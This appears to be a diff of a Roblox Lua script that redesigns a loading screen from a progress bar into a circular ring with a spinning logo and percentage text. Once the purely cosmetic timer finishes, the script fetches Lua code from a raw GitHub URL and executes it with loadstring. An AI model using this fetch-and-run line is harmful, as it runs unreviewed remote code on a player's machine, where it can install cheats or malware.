@@ -3,102 +3,95 @@ local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
 -- 创建 ScreenGui
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "FancyLoadingScreen"
+screenGui.Name = "CircleLoadingScreen"
 screenGui.ResetOnSpawn = false
 screenGui.IgnoreGuiInset = true
 screenGui.Parent = playerGui
 
--- 创建半透明背景
+-- 半透明背景
 local bg = Instance.new("Frame")
 bg.Size = UDim2.new(1, 0, 1, 0)
 bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-bg.BackgroundTransparency = 0.3
+bg.BackgroundTransparency = 0.4
 bg.Parent = screenGui
 
--- 添加中心 Logo
+-- 圆形框
+local circleFrame = Instance.new("Frame")
+circleFrame.Size = UDim2.new(0, 150, 0, 150)
+circleFrame.Position = UDim2.new(0.5, -75, 0.5, -75)
+circleFrame.BackgroundTransparency = 1
+circleFrame.Parent = bg
+
+-- 环形 UIStroke
+local circleStroke = Instance.new("UIStroke")
+circleStroke.Color = Color3.fromRGB(0, 255, 170)
+circleStroke.Thickness = 10
+circleStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+circleStroke.Parent = circleFrame
+
+-- 进度环形遮罩
+local progressMask = Instance.new("ImageLabel")
+progressMask.Size = UDim2.new(1, 0, 1, 0)
+progressMask.Position = UDim2.new(0, 0, 0, 0)
+progressMask.BackgroundTransparency = 1
+progressMask.Image = "rbxassetid://7072718368" -- 可替换为环形素材（或者自己上传）
+progressMask.ImageColor3 = Color3.fromRGB(0, 255, 170)
+progressMask.Rotation = 0
+progressMask.Parent = circleFrame
+
+-- 中心 LOGO
 local logo = Instance.new("ImageLabel")
-logo.Size = UDim2.new(0, 100, 0, 100)
-logo.Position = UDim2.new(0.5, -50, 0.4, -50)
+logo.Size = UDim2.new(0, 60, 0, 60)
+logo.Position = UDim2.new(0.5, -30, 0.5, -30)
 logo.BackgroundTransparency = 1
-logo.Image = "rbxassetid://7072718368" -- 这里换成你自己的图片 ID
-logo.Parent = bg
+logo.Image = "rbxassetid://7072718368" -- 可替换成你的 LOGO
+logo.Parent = circleFrame
 
--- 创建进度条外框
-local barBg = Instance.new("Frame")
-barBg.Size = UDim2.new(0, 400, 0, 30)
-barBg.Position = UDim2.new(0.5, -200, 0.6, -15)
-barBg.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-barBg.BorderSizePixel = 0
-barBg.Parent = bg
-
-local bgCorner = Instance.new("UICorner")
-bgCorner.CornerRadius = UDim.new(0, 15)
-bgCorner.Parent = barBg
-
--- 创建渐变进度条
-local bar = Instance.new("Frame")
-bar.Size = UDim2.new(0, 0, 1, 0)
-bar.BorderSizePixel = 0
-bar.Parent = barBg
-
-local barCorner = Instance.new("UICorner")
-barCorner.CornerRadius = UDim.new(0, 15)
-barCorner.Parent = bar
-
-local gradient = Instance.new("UIGradient")
-gradient.Color = ColorSequence.new{
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 170, 255)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 170))
-}
-gradient.Rotation = 0
-gradient.Parent = bar
-
--- 创建百分比文字
+-- 百分比文字
 local percentLabel = Instance.new("TextLabel")
 percentLabel.Size = UDim2.new(1, 0, 1, 0)
+percentLabel.Position = UDim2.new(0, 0, 0, 0)
 percentLabel.BackgroundTransparency = 1
 percentLabel.Text = "0%"
 percentLabel.Font = Enum.Font.GothamBold
 percentLabel.TextSize = 22
 percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-percentLabel.Parent = barBg
+percentLabel.Parent = circleFrame
 
--- 让 Logo 旋转动画
+-- 旋转 Logo 动画
 task.spawn(function()
-    while screenGui.Parent do
-        logo.Rotation += 1
-        wait(0.01)
-    end
+	while screenGui.Parent do
+		logo.Rotation += 1
+		wait(0.01)
+	end
 end)
 
--- 平滑加载动画
-local duration = 5 -- 加载时间
+-- 平滑环形进度
+local duration = 5
 local elapsed = 0
 local step = 0.02
 
 while elapsed < duration do
-    elapsed += step
-    local progress = math.clamp(elapsed / duration, 0, 1)
-    bar.Size = UDim2.new(progress, 0, 1, 0)
-    percentLabel.Text = string.format("%d%%", math.floor(progress * 100))
-    wait(step)
+	elapsed += step
+	local progress = math.clamp(elapsed / duration, 0, 1)
+	progressMask.ImageRectSize = Vector2.new(1024 * progress, 1024)
+	percentLabel.Text = string.format("%d%%", math.floor(progress * 100))
+	wait(step)
 end
 
-bar.Size = UDim2.new(1, 0, 1, 0)
 percentLabel.Text = "100%"
 
 wait(0.5)
 
 -- 执行外部脚本
 local success, result = pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/xiao66778/xGB/refs/heads/main/1168.lua"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/xiao66778/xGB/refs/heads/main/1168.lua"))()
 end)
 
 if success then
-    print("脚本加载成功！")
+	print("脚本加载成功！")
 else
-    warn("脚本加载失败：" .. tostring(result))
+	warn("脚本加载失败：" .. tostring(result))
 end
 
--- 清理
 screenGui:Destroy()
